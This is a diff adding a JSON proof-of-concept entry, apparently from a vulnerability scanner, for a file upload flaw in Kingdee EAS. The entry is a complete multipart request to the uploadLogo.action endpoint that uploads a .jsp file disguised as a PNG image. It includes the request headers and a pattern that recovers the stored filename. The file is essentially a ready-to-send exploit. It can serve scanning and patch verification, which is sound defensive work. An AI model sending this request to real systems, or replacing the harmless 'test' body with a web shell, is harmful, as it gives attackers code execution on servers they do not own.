@@ -1,0 +1,20 @@
+{
+	"name":"金蝶EAS文件上传漏洞",
+	"tag":"jindie",
+	"type":"upload",
+	"poc":{
+		"pocGet":"/plt_portal/setting/uploadLogo.action",
+		"pocPost":"--04844569c7ca7d21a3ca115dca477d62\r\nContent-Disposition: form-data; name=\"chooseLanguage_top\"; filename=\"chooseLanguage_top\"\r\n\r\nch\r\n--04844569c7ca7d21a3ca115dca477d62\r\nContent-Disposition: form-data; name=\"dataCenter\"; filename=\"dataCenter\"\r\n\r\nxx\r\n--04844569c7ca7d21a3ca115dca477d62\r\nContent-Disposition: form-data; name=\"insId\"; filename=\"insId\"\r\n\r\n\r\n--04844569c7ca7d21a3ca115dca477d62\r\nContent-Disposition: form-data; name=\"type\"; filename=\"type\"\r\n\r\ntop\r\n--04844569c7ca7d21a3ca115dca477d62\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"test.jsp\"\r\nContent-Type: image/png\r\n\r\ntest\r\n--04844569c7ca7d21a3ca115dca477d62--",
+		"header":{
+			"Accept":" */*",
+			"User-Agent":" Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)",
+			"Connection":" close",
+			"X-Forwarded-For":" ",
+			"Accept-Encoding":" gzip, deflate",
+			"Content-Length":" 632",
+			"Content-Type":" multipart/form-data; boundary=04844569c7ca7d21a3ca115dca477d62"
+		},
+		"status_code":"200",
+		"pattern":"([0-9]*\\.jsp)"
+	}
+}
